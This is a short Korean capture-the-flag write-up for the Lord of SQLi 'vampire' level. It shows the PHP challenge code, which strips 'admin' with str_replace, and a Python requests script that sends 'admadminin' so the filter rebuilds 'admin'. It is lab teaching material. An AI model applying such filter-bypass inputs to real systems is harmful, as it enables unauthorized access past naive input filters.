
## Darkelf Write-up

### 문제
``` php
<?php  
include "./config.php";  
login_chk();  
dbconnect();  
if(preg_match('/\'/i', $_GET[id])) exit("No Hack ~_~");  
$_GET[id] = strtolower($_GET[id]);  
$_GET[id] = str_replace("admin","",$_GET[id]);  
$query = "select id from prob_vampire where id='{$_GET[id]}'";  
echo "<hr>query : <strong>{$query}</strong><hr><br>";  
$result = @mysql_fetch_array(mysql_query($query));  
if($result['id'] == 'admin') solve("vampire");  
highlight_file(__FILE__);  
?>
```

### Exploit 코드
``` python
import requests

url = 'https://los.rubiya.kr/vampire_e3f1ef853da067db37f342f3a1881156.php'
cookies = {'PHPSESSID' : 'My PHPSESSID'}
params = {}
params['id'] = 'admadminin'

res = requests.get(url, cookies=cookies, params=params)

if "Clear" in res.text :
    print("[♪] VAMPIRE Clear")
```
이번 문제는 id가 admin이면 문제가 풀리는데 **str_replace**를 이용해 admin을 빈 값으로 바꾼다.  
**adm`admin`in**과 같이 admin 단어 사이에 admin을 넣으면 `admin`이 빈 값으로 바뀌고, 
**admin**이 되어 문제가 해결된다.